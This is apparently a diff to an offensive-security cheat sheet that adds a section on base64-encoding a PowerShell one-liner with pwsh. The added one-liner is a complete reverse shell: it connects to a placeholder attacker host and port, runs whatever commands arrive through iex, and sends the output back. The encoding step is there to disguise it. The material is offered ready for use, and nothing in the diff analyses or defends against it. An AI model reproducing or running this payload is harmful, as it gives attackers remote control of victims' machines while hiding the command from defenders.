@@ -4544,6 +4544,16 @@ PS C:\> type <FILE> | findstr /l <STRING>
 PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
 ```
 
+#### Base64 Encoding using pwsh
+
+```c
+$ pwsh
+PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+PS> $EncodedText
+```
+
 #### Import Module to PowerShell cmdlet
 
 ```c
